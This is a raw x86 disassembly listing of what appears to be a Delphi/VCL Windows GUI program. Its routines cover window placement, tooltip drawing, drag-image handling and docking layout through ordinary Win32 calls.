cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_445f48
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_445fd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445fda
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d5bc
mov edx eax
add edx 0x6
mov eax esi
call sub_43d908
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43e14c
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d5d8
mov edx eax
add edx 0x4
mov eax esi
call sub_43d92c
sub_445fe0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_4461b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e17c
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43f3d8
mov eax [ esi ]
call sub_45bc28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45bc34
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45bc28
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45bc1c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45bc34
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45bc10
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45bc1c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45bc10
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44209c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4461c0
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4042a0
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_449278
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call [ rw-data ]
sub_4461c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4461f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412640
mov eax esi
call sub_4404a0
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ esi + 0x208 ]
call sub_41d780
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_44624c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412640
call sub_4301bc
call sub_43029c
test al al
jne r-xdata
call sub_4301bc
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43065c
push esp
push 0x1
push 0xf
push 0x0
call sub_4301bc
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43035c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4462b8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4429a4
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_4462dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_446334
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4463f4
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c0fc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423d68
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c0fc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423d68
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_446400
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44b570
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_446460
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c1e4
mov eax ebx
call sub_44b39c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_44648c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44b39c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_446334
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4464ec
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_446400
push 0x0
call ShowCursor
sub_4464ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44b39c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_446550
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4462dc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_446550
push ebx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_446574
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_4462dc
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4465e8
push ebx
push esi
mov esi eax
mov eax esi
call sub_44b39c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_446550
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_446448
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_446630
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440694
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43cd28
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_44668c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4407b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4466dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d39c
xor eax eax
push ebp
push sub_44677a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41d800
xor eax eax
push ebp
push sub_446757
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43cd40
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44675e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d800
retn
sub_44678c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_446820
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4467a8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_446820
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_446e18
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_446820
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_446854
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4468e4
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov edx 0x2
call sub_4468e4
jmp r-xdata
retn
sub_44689c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_446950
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov edx 0x2
call sub_446950
jmp r-xdata
retn
sub_4468e4
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_446d18
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_446950
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_446804
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_446d18
push eax
mov eax esi
call sub_446854
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_446d18
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_446a00
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_446804
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_446e18
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_446950
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_446804
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_446950
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_446854
mov edx eax
add edx esi
mov eax ebx
call sub_446d40
mov edx edi
mov eax ebx
call sub_446d40
jmp r-xdata
mov eax ebx
call sub_446ba0
mov eax ebx
call sub_446df0
mov ebx eax
test ebx ebx
jne r-xdata
sub_446aa8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403fe0
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404034
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
sub_446aec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_40348c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_446b5d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43ee80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_446b70
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_446df0
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_446ba0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_446950
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_446950
mov esi eax
push ebp
call sub_446b70
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446df0
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4468e4
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4468e4
mov ecx ebx
pop edx
call sub_412668
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43db0c
mov eax [ ebp - 0x4 ]
call sub_446d18
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_446d18
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_446d18
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_446d18
push ebx
mov ebx eax
mov eax ebx
call sub_446820
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4467a8
test al al
je r-xdata
mov eax ebx
call sub_446854
pop ebx
retn
sub_446d54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446d40
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4467f0
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_446d44
mov edx esi
call sub_446d54
sub_446d90
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_446d18
mov edi eax
mov eax ebx
call sub_446854
cmp edi eax
jl r-xdata
mov eax esi
call sub_446a00
mov eax [ esi + 0x1c ]
push eax
push sub_4488a0
mov edx esi
call sub_4470cc
mov eax ebx
call sub_446d18
mov edi eax
mov eax esi
call sub_44689c
cmp edi eax
jle r-xdata
mov eax ebx
call sub_446d90
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_446dfc
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_446820
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_446e24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403260
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4035b4
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4467cc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cd6c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_423828
mov edx eax
mov eax ebx
call sub_41cee8
mov eax [ ebp - 0x4 ]
call sub_446ff4
xor eax eax
push ebp
push sub_446f30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_441698
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_446a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446f37
mov eax [ ebp - 0x4 ]
call sub_446ff8
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44165c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_446f37
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_448dc8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_446f8c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_447ff8
mov eax [ esi + 0x10 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_44700c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
